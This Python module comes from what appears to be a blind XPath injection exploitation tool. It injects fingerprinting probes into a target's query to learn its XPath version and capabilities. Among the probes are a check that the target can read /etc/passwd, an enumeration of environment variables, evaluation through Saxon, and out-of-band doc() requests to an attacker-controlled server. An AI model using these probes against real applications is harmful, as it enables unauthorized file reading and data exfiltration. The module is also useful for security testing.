import asyncio
from collections.abc import Callable
from typing import NamedTuple

from xpath import E, Expression, func, Functions

from .attack import AttackContext, check
from .injections import Injection
from .algorithms import ASCII_SEARCH_SPACE

fs_func = Functions('Q{http://expath.org/ns/file}')
saxon_func = Functions('saxon:')


class Feature(NamedTuple):
    name: str
    tests: list[Expression | Callable]
    # Expressions that MUST return False.  If XPath errors cause the oracle to
    # always return True, the false_tests will catch the false-positive.
    false_tests: list[Expression] = []


def test_oob(path):
    async def test_oob_inner(context: AttackContext, injector: Injection):
        if not context.oob_details:
            return False

        async with context.start_oob_server() as ctx:
            doc_expr = func.doc(f'{ctx.oob_host}{path}').add_path('/data') == ctx.oob_app['test_response_value']
            return await check(
                context,
                injector(context.target_parameter_value, doc_expr)
            )

    return test_oob_inner


features = [
    Feature('xpath-2',
            [
                func.lower_case('A') == 'a',
                func.ends_with('thetest', 'test'),
                func.encode_for_uri('test') == 'test'
            ],
            false_tests=[
                func.lower_case('A') == 'z',
            ]),
    Feature('xpath-3',
            [
                func.boolean(func.generate_id(E('/')))
            ]),
    Feature('xpath-3.1',
            [
                func.contains_token('a', 'a')
            ],
            false_tests=[
                func.contains_token('a', 'z'),
            ]),
    Feature('normalize-space',
            [
                func.normalize_space('  a  b ') == 'a b'
            ],
            false_tests=[
                func.normalize_space('  a  b ') == 'zzz',
            ]),
    Feature('substring-search',
            [
                func.string_length(func.substring_before(ASCII_SEARCH_SPACE, 'h')) == ASCII_SEARCH_SPACE.find('h'),
                func.string_length(func.substring_before(ASCII_SEARCH_SPACE, 'o')) == ASCII_SEARCH_SPACE.find('o')
            ],
            false_tests=[
                func.string_length(func.substring_before(ASCII_SEARCH_SPACE, 'h')) == 9999,
            ]),
    Feature('codepoint-search',
            [
                func.string_to_codepoints("test")[1] == 116
            ],
            false_tests=[
                func.string_to_codepoints("test")[1] == 999,
            ]),
    Feature('environment-variables',
            [
                func.exists(func.available_environment_variables())
            ],
            false_tests=[
                func.empty(func.available_environment_variables()),
            ]),
    Feature('document-uri',
            [
                func.document_uri(E('/'))
            ]),
    Feature('base-uri',
            [
                func.base_uri()
            ]),
    Feature('current-datetime',
            [
                func.string(func.current_dateTime())
            ]),
    Feature('unparsed-text',
            [
                func.unparsed_text_available(func.document_uri(E('/')))
            ]),
    Feature('doc-function',
            [
                func.doc_available(func.document_uri(E('/')))
            ]),
    Feature('linux',
            [
                func.unparsed_text_available('/etc/passwd')
            ]),
    Feature('expath-file',
            [
                func.string_length(fs_func.current_dir()) > 0
            ]),
    Feature('saxon',
            [
                saxon_func.evaluate('1+1') == 2
            ],
            false_tests=[
                saxon_func.evaluate('1+1') == 9,
            ]),
    Feature('oob-http', [test_oob('/test/data')]),
    Feature('oob-entity-injection', [test_oob('/test/entity')])
]


def _negative_tests(feature: Feature) -> list[Expression]:
    """The known-false probes for a feature. Prefer hand-written false_tests;
    otherwise auto-derive them by negating each (non-callable) positive test.

    This makes the "errors masquerading as True" guard universal instead of
    opt-in: previously ~10 of the features (including file-read capabilities
    like `linux`/`unparsed-text`) shipped no false_test and were accepted on a
    single bare True, so a saturated/error-masking oracle could false-positive
    them. A negated positive test errors/saturates in lockstep with its
    positive, so the control catches the false-positive uniformly."""
    if feature.false_tests:
        return list(feature.false_tests)
    return [func.not_(test) for test in feature.tests if not callable(test)]


async def detect_features(context: AttackContext, injector: Injection) -> list[Feature]:
    returner = []

    def run(test):
        if callable(test):
            return test(context, injector)
        elif context.injection:
            return check(context, test)
        else:
            return check(context, injector(context.target_parameter_value, test))

    for feature in features:
        checks = await asyncio.gather(*[run(test) for test in feature.tests])
        positive_pass = all(checks)

        # A known-false probe MUST read False. If it reads True the oracle is
        # treating XPath errors (or everything) as True, so the positive result
        # is meaningless — reject the feature.
        negative_pass = True
        negative_tests = _negative_tests(feature)
        if positive_pass and negative_tests:
            negative_checks = await asyncio.gather(*[run(ft) for ft in negative_tests])
            if any(negative_checks):
                negative_pass = False

        returner.append((feature, positive_pass and negative_pass))

    return returner
